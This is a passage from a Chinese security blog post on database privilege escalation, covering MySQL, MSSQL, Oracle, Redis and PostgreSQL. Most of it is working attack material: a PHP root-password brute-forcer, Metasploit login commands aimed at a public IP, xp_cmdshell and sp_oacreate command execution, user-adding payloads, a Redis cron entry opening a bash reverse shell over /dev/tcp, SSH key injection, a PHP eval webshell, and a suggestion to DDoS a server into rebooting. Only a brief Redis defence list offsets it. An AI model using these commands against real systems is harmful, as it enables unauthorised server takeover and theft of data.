&lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;cent一下er&gt;</span><br><span class="line">   &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;h1&gt;Mysql账号密码在线爆破工具 V2.0&lt;/h1&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> if(@$_POST[&#x27;submit&#x27;])&#123;</span><br><span class="line">   $host = @$_POST[&#x27;host&#x27;];</span><br><span class="line">   if($host!==&quot;&quot;)&#123;</span><br><span class="line">    $username = &quot;root&quot;;//用户名字典</span><br><span class="line">	$password = array();</span><br><span class="line">	$filename = &quot;pwd.txt&quot;; //同目录下密码字典</span><br><span class="line">	$i=0;</span><br><span class="line">	$file = fopen($filename,&#x27;r&#x27;);</span><br><span class="line">	while(! feof($file))&#123;</span><br><span class="line">		$password[$i] = fgets($file);</span><br><span class="line">		$i++;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose($file);</span><br><span class="line">    echo &quot;&lt;hr&gt;&lt;br&gt;-----------------------爆破状态-----------------------&lt;br&gt;&quot;;</span><br><span class="line">    for ($l=0; $l &lt;= count($password); $l++) &#123;</span><br><span class="line">		$password1 = trim($password[$l]);	//除去左右空白</span><br><span class="line">		if(@mysql_connect($host, $username, $password1))&#123;</span><br><span class="line">			echo &quot;&lt;script&gt;alert(&#x27;数据库密码为：&#123;$password1&#125;&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;br&gt;&lt;br&gt;&lt;font color=&#x27;red&#x27;&gt;爆破成功--密码--&gt;&quot;.@$password1.&quot;&lt;/font&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br&gt;----------------------爆破结束-----------------------&lt;br&gt;&lt;hr&gt;&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;黑客，输入数据库IP地址&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;form action=&quot;Completion.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">   数据库IP地址:&lt;input type=&quot;text&quot; name=&quot;host&quot;/&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;爆破&quot; name=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>支持外联</strong>：远程本地暴力破解，服务器本地破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">show options</span><br><span class="line">set rhost 47.99.71.28</span><br><span class="line">set username root</span><br><span class="line">set pass_file /opt/mysql_pwd.txt</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol></li><li><p>目前数据库提权对应的技术以及方法</p></li></ol><h3 id="数据库端口号"><a class="markdownIt-Anchor" href="#数据库端口号"></a> 数据库端口号</h3><p><strong>关系型</strong></p><table><thead><tr><th>类型</th><th>数据库</th><th>默认端口</th></tr></thead><tbody><tr><td><strong>关系型</strong></td><td><strong>Oracle</strong></td><td><strong>1521</strong></td></tr><tr><td></td><td><strong>Sql server</strong></td><td><strong>1433</strong></td></tr><tr><td></td><td><strong>Mysql</strong></td><td><strong>3306</strong></td></tr><tr><td></td><td>Pointbase</td><td>9092</td></tr><tr><td></td><td><strong>Db2</strong></td><td><strong>50000</strong></td></tr><tr><td></td><td>Sybase</td><td>5000</td></tr><tr><td></td><td><strong>PostgreSQL</strong></td><td><strong>5432</strong></td></tr><tr><td><strong>非关系型</strong></td><td>MongoDB</td><td>27017</td></tr><tr><td></td><td><strong>Redis</strong></td><td><strong>6379</strong></td></tr><tr><td></td><td>memcached</td><td>11211</td></tr></tbody></table><h3 id="mysqludfmof启动项反弹shell"><a class="markdownIt-Anchor" href="#mysqludfmof启动项反弹shell"></a> Mysql（UDF/MOF/启动项/反弹shell）</h3><h4 id="文件存储方式"><a class="markdownIt-Anchor" href="#文件存储方式"></a> 文件存储方式</h4><p>存储数据的目录是<code>Mysql/data/数据库名/表名.myd</code>，里面有表里的数据。而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到，我们可以在<code>Mysql/data/mysql/user.myd</code>中找到该文件！</p><h4 id="udf"><a class="markdownIt-Anchor" href="#udf"></a> UDF</h4><blockquote><p>UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p><p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p></blockquote><p>前提是：得到数据库的账号密码（root），先导出dll，导出目录必须可以加载dll文件（secure_file_priv项设置为空），然后我们再执行命令。需要注意的问题，<strong>识别Mysql的版本</strong></p><ol><li>小于5.1：导出目录：<code>c:/windows</code>或<code>system32</code></li><li>大于等于5.1：导出安装目录<code>/lib/plugin</code>（这个<code>plugin</code>目录需要自己建立或者利用NTFS流创建）</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>怎么判定版本</strong>：<code>select @@version</code></p><p><strong>怎么找到目录</strong>：<code>select @@basedir</code>，<code>show variables like ‘%plugins%’</code></p><p><strong>怎么快速操作</strong>：</p><ol><li><p>例如，我们知道了目录为：<code>c:/mysql/</code>，版本为5.5.3，则在<code>mysql/lib</code>下创建目录，有：<code>mysql/lib/plugin</code></p></li><li><p>设置secure_file_priv项为空（my.ini）</p></li><li><p>我们有一个dll，将至上传（安装）到该目录下。就可以执行了。</p></li><li><p>过程中我们需要上传一个webshell到服务器上，然后再攻击。这个webshell可以是大马也可以是专门的mysql.php脚本。</p><ol><li><p>如果没有webshell，那就<strong>使用dumpfile通过16进制数据流写入udf文件</strong>。（当然可以Loadfile）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x4d5a900..... into dump file &quot;C:\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。</p><p>流程是：<strong>创建表+insert+update concat+dumpfile</strong></p><p>注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用取四合一法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。</p></li></ol></li></ol><p>相关问题：</p><ol><li>函数已存在： Function ‘sys_eval’ already exists。可以直接调用就调用，没办法的话就删了重新添加，如果存在但是用不了，那就重启数据库，然后重新创建。</li><li>位数不对：Can’t open shared library ‘udf.dll’ (errno: 193 )。更换32/64位</li></ol><p>参考：</p><ol><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">https://www.freebuf.com/articles/database/291175.html</a></li><li>可以在上面的linux提权那里看一些操作</li></ol><h4 id="mof"><a class="markdownIt-Anchor" href="#mof"></a> MOF</h4><p>成功率最低。MOF是windows中的一个文件，可以每隔5秒监控进程创建和死亡。如果我们替换这个文件，那么我们就可执行我们上传的mod，其中有一段是vbs脚本，所以可以运行cmd命令，一般是<strong>添加用户</strong>（以mysql-root权限）。</p><ul><li>导出自定义 mof 文件到系统目录加载</li><li>同udf一样需要手工修改my.ini配置文件，添加 secure-file-priv=</li></ul><p>所以流程如下：</p><ol><li>准备一个mof文件，以及前置条件，例如root权限，目录可写等等。</li><li>使用<code>select load_file(...) into dumpfile &quot;c:/mysql...&quot;</code>，替换mof。</li><li>过一会就可以了。</li></ol><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Zlirving_/article/details/106618559">https://blog.csdn.net/Zlirving_/article/details/106618559</a></p><h4 id="启动项提权"><a class="markdownIt-Anchor" href="#启动项提权"></a> 启动项提权</h4><ul><li><strong>（基于配合操作系统自启动）</strong></li><li>导出自定义可执行文件到启动目录配合重启执行</li><li>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！</li></ul><p>我们需要开启外联（大马里有相关命令）<code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' INDENTIFIED BY 'root' WITH GRANT OPTION;</code>（执行这个当然需要root权限）</p><p>流程如下：</p><ol><li><p>要么～使用msf中的mysql_start_up模块提升权限即可</p></li><li><p>要么～上传bat文件：将创建好的bat文件进行服务器启动项写入，配合重启执行！ bat文件实例。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">net</span> user xxx <span class="number">123</span>!@#ws /add</span><br></pre></td></tr></table></figure></li><li><p>使用DDoS，让服务器重启！</p></li></ol><h4 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h4><ul><li><p><code>nc -l -p 5577</code></p></li><li><p>nc相关知识：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11748488.html">https://www.cnblogs.com/-chenxs/p/11748488.html</a></p></li></ul><p>流程如下：</p><ol><li>要么自己创建反弹函数</li><li>要么使用mysql.php创建一个反弹函数backdoor。</li></ol><h3 id="mssql"><a class="markdownIt-Anchor" href="#mssql"></a> MSSQL</h3><p>特点：</p><ol><li>默认支持外联</li></ol><h4 id="xp_cmdshell"><a class="markdownIt-Anchor" href="#xp_cmdshell"></a> xp_cmdshell</h4><p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。</p><p>当我们使用这个函数执行命令的时候会提示：<strong>访问组件xp_cmdshell过程被阻止</strong></p><p>则我们需要开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p>如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure><h4 id="sp_oacreate-提权"><a class="markdownIt-Anchor" href="#sp_oacreate-提权"></a> sp_oacreate 提权</h4><p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。同样，他会默认关闭，遇到和xp_cmdshell一样的问题，则打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p>使用（<em>注意，我们需要对输出结果重定向，不然可能输出不出来，后面我们用webshell看就好了</em>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt; c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure><h4 id="沙盒提权"><a class="markdownIt-Anchor" href="#沙盒提权"></a> 沙盒提权</h4><p>参考资料：<a target="_blank" rel="noopener" href="https://blog.51cto.com/11797152/2411770">https://blog.51cto.com/11797152/2411770</a></p><p>按照步骤来就好</p><ol><li><p>提权语句（show advanced options设置为1就是可以更改配置）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><p>不开启的话在执行 xp_regwrite 会提示让我们开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure></li><li><p>关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite</span><br><span class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br></pre></td></tr></table></figure></li><li><p>查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br></pre></td></tr></table></figure></li><li><p>执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>沙盒模式SandBoxMode参数含义（默认是2）</p><p><code>0</code>：在任何所有者中禁止启用安全模式<br><code>1</code>：为仅在允许范围内<br><code>2</code>：必须在access模式下<br><code>3</code>：完全开启</p><p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">恢复配置（暂不执行）</span><br><span class="line">--</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure></blockquote><h3 id="oracle"><a class="markdownIt-Anchor" href="#oracle"></a> ORACLE</h3><p>测试：</p><ol><li>普通用户模式：拥有一个普通用户权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令</li><li>DBA用户模式：拥有DBA账户密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试</li><li>注入提升模式：拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</li></ol><p>注：</p><ul><li>jsp网站后门不用提权，默认就是system权限</li></ul><h4 id="oracle工具提权"><a class="markdownIt-Anchor" href="#oracle工具提权"></a> Oracle工具提权</h4><p>先使用sqlmap扫一下看是不是存在注入点，然后用rebeyond的工具干就完事了。</p><h3 id="redis"><a class="markdownIt-Anchor" href="#redis"></a> Redis</h3><p>Redis未授权漏洞：可以以root运行+使用内置指令+写入ssh密钥</p><p>常用指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 链接数据库</span><br><span class="line">redis-cli -h &lt;ip&gt; -p 6397 -a &lt;passwd&gt;</span><br><span class="line"># 查看信息</span><br><span class="line">info</span><br><span class="line"># 设置变量/获取变量</span><br><span class="line">set x &quot;test&quot;</span><br><span class="line">get x</span><br><span class="line"># 删除数据库</span><br><span class="line">flushall</span><br><span class="line"># 设置主从关系</span><br><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure><h4 id="计划任务反弹shell"><a class="markdownIt-Anchor" href="#计划任务反弹shell"></a> 计划任务反弹shell</h4><p>计划任务（路径：<code>/var/spool/cron</code>）。执行命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.80.137</span><br><span class="line">set  x   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.80.137/5555 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注意改一下IP端口就可以了，在自己的主机上：<code>nc -l -p 5555</code></p><h4 id="写入ssh-keygen"><a class="markdownIt-Anchor" href="#写入ssh-keygen"></a> 写入ssh-keygen</h4><p>条件：</p><ol><li>以root启动</li><li>开放ssh服务</li><li>未授权</li></ol><p>流程：</p><ol><li>在攻击机生成一个公钥文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh/        #如果.ssh不存在的话,创建.ssh文件夹。</span><br><span class="line">ssh-keygen -t rsa     #执行完命令然后回车三次就结束了。</span><br><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure><ol start="2"><li>未授权或者弱口令访问redis服务，并写入公钥：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis -h 192.168.223.132      登录redis服务</span><br><span class="line">config set dir /root/.ssh/    #设置保存路径</span><br><span class="line">config set dbfilename authorized_keys    #设置保存文件名</span><br><span class="line">set x &quot;\n\n\n ??? \n\n\n&quot;    #将公钥写入x键，用&quot;\n\n\n&quot;包裹住公钥，并且跟公钥之间用空格隔开</span><br><span class="line">save    # 保存</span><br></pre></td></tr></table></figure><ol start="3"><li>用私钥进行登录：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa    #第一次登陆需要输入yes</span><br></pre></td></tr></table></figure><h4 id="主从复制"><a class="markdownIt-Anchor" href="#主从复制"></a> 主从复制</h4><p>为了缓解数据库压力，redis使用两个服务器，一个负责读一个负责写，来减轻流量压力。在两个redis服务器设置主从模式的时候，主机实例可以通过<code>FULLRESYNC</code>指令同步文件在从机实例上，然后在从机上加载。</p><p>如果同步了恶意so文件，则从机加载该文件，我们主机就可以执行拓展命令。</p><p>条件：</p><ol><li>服务器允许与其他IP发起TCP请求</li><li>允许主从复制</li><li>版本：4.x-5.0.5（可以编译so文件）</li></ol><p>流程：</p><ol><li>攻击机对受害机：<code>slaveof ip port</code></li><li>使用Redis-RCE工具获取受害机的反弹shell（使用nc模拟Redis主服务器，进行模拟Redis主从交互过程）</li></ol><p>实现：</p><ol><li><p>生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>攻击端执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f 恶意.so</span><br><span class="line"></span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">cd redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p><h4 id="低权限写入webshell"><a class="markdownIt-Anchor" href="#低权限写入webshell"></a> 低权限写入webshell</h4><p>流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# redis-cli -h 192.168.223.132</span><br><span class="line">192.168.223.132:6379&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; set x &quot;&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h4 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h4><ol><li>绑定需要访问数据库IP，将127.0.0.1修改为需要访问该数据库的IP</li><li>修改帐号密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。</li><li>低权限运行Redis</li><li>禁止使用帐号密码登录</li></ol><h3 id="postgresql"><a class="markdownIt-Anchor" href="#postgresql"></a> PostgreSql</h3><p>PostgreSQL 是一款关系型数据库。其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。 提权利用的是一下漏洞。流程为：连接-利用漏洞-执行-提权。</p><p>判断权限去应用以下漏洞：一般名字为PostgreSql的用户就是高权限</p><h4 id="cve-2018-1058"><a class="markdownIt-Anchor" href="#cve-2018-1058"></a> CVE-2018-1058</h4><p>PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。（低权限用户用这个）</p><h4 id="cve-2019-9193"><a class="markdownIt-Anchor" href="#cve-2019-9193"></a> CVE-2019-9193</h4><p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。（高权限提权）</p><h1 id="其他资源"><a class="markdownIt-Anchor" href="#其他资源"></a> 其他资源</h1><h2 id="复现注意"><a class="markdownIt-Anchor" href="#复现注意"></a> 复现注意</h2><ol><li>搭建数据库后要看防火墙是否把端口给拦截了，是的话重新开启</li></ol><h2 id="大马编写"><a class="markdownIt-Anchor" href="#大马编写"></a> 大马编写</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/125038306">https://blog.csdn.net/qq_53079406/article/details/125038306</a></p><h1 id="思维导图"><a class="markdownIt-Anchor" href="#思维导图"></a> 思维导图</h1><p><img src="../../images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/68747470733a2f2f67697465652e636f6d2f736d616c6c2d6c656563682d736872696d702f7479706f72615f7069632f7261772f6d61737465722f36342e706e67.png" alt="img"></p></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="权限提升" target="_blank" rel="external">https://j3f5.github.io/articles/2023/06/14/权限提升/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/j3f5" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/j3f5" target="_blank"><span class="text-dark">妄想星空</span><small class="ml-1x">Web Pentestor</small></a></h3><div>网安小菜鸡，在线总结</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/" title="渗透测试需要注意的点"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul><div class="copyright"><div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!0,appId:"yCi6g1FoJhBaWWsmJrysnhSM-gzGzoHsz",appKey:"okzCVsRtNdmyQDW34mMUxKOr",placeholder:"留言",avatar:"mm",meta:meta,pageSize:"10",visitor:!0})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a 